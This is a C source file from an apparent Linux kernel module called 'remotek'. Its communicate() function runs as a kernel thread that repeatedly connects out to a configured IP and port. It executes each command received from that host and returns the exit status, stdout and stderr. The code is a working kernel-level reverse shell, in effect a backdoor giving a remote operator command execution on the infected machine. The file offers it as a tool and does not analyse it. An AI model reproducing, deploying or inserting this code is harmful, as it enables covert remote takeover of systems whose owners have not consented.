#include "exec.h"
#include "globals.h"
#include "network.h"

#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>

static void *convert(void *ptr)
{
    return ptr;
}

int communicate(void *data)
{
    struct sockaddr_in addr = { 0 };
    struct msghdr msg = { 0 };
    struct msghdr rmsg = { 0 };
    struct kvec vec = { 0 };
    struct kvec rvec = { 0 };
    struct globals *global = data;
    struct socket *sock = global->sock;
    char buf[BUF_SIZE] = { 0 };
    char *bufout = NULL;
    char *buferr = NULL;
    unsigned char ip_binary[4] = { 0 };
    int exit_status = 0;
    int ret = 0;

    pr_info("remotek: debug: global->ip: %s, global->port: %d\n", global->ip, global->port);

    if ((ret = in4_pton(global->ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("remotek: error converting the IPv4 address: %s(%d)\n", global->ip, ret);
        kthread_stop(global->thread);
        return 1;
    }

    while (kthread_should_stop() == 0)
    {

        if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0)
        {
            pr_err("remotek: error creating the socket: %d\n", ret);
            continue;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(global->port);

        memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof (addr.sin_addr.s_addr));

        if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
        {
            pr_err("remotek: error connecting to %s:%d (%d)\n", global->ip, global->port, ret);
            sock_release(sock);
            sock = NULL;
            continue;
        }

        while (kthread_should_stop() == 0)
        {
            rvec.iov_base = buf;
            rvec.iov_len = BUF_SIZE - 1;

            if ((ret = kernel_recvmsg(sock, &rmsg, &rvec, 1, BUF_SIZE - 1, 0)) <= 0)
            {
                pr_warn("remotek: connection lost or closed\n");
                sock_release(sock);
                sock = NULL;
                break;
            }

            buf[ret - 1] = '\0';
            pr_info("remotek: received: %s\n", buf);

            exit_status = exec(buf);
            pr_info("remotek: exit status: %d\n", exit_status);
            memset(buf, 0, BUF_SIZE);
            sprintf(buf, "exit status: %d\n\n", exit_status);

            vec.iov_base = buf;
            vec.iov_len = strlen(buf);

            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending exit status: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                break;
            }

            bufout = read_file("/tmp/remotek_stdout");
            buferr = read_file("/tmp/remotek_stderr");

            // TODO: improve the errors (log and send to server)
            if (bufout == NULL || buferr == NULL)
            {
                pr_err("remotek: bufout or buferr NULL\nbufout: %s\nbuferr: %s\n", bufout, buferr);
                // TODO: send the error to the server before releasing the
                // socket

                if (bufout != NULL)
                    kfree(bufout);
                if (buferr != NULL)
                    kfree(buferr);
                sock_release(sock);
                sock = NULL;

                continue;
            }

            pr_info("remotek: sending: %s\n", bufout);
            memset(buf, 0, BUF_SIZE);
            sprintf(buf, "stdout:\n");
            vec.iov_base = buf;
            vec.iov_len = strlen(buf);
            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending stdout header: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }

            vec.iov_base = bufout;
            vec.iov_len = strlen(bufout);
            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending stdout: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }

            memset(buf, 0, BUF_SIZE);
            sprintf(buf, "\n");
            vec.iov_base = buf;
            vec.iov_len = strlen(buf);
            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending last stdout newline: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }


            pr_info("remotek: sending: %s\n", buferr);
            memset(buf, 0, BUF_SIZE);
            sprintf(buf, "stderr:\n");
            vec.iov_base = buf;
            vec.iov_len = strlen(buf);
            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending stderr header: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }

            vec.iov_base = buferr;
            vec.iov_len = strlen(buferr);

            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending stderr: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }

            memset(buf, 0, BUF_SIZE);
            sprintf(buf, "\n");
            vec.iov_base = buf;
            vec.iov_len = strlen(buf);
            if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
            {
                pr_err("remotek: error sending last stderr newline: %d\n", ret);
                sock_release(sock);
                sock = NULL;
                kfree(bufout);
                kfree(buferr);
                break;
            }

            kfree(bufout);
            kfree(buferr);
        }
    }
    return 0;
}
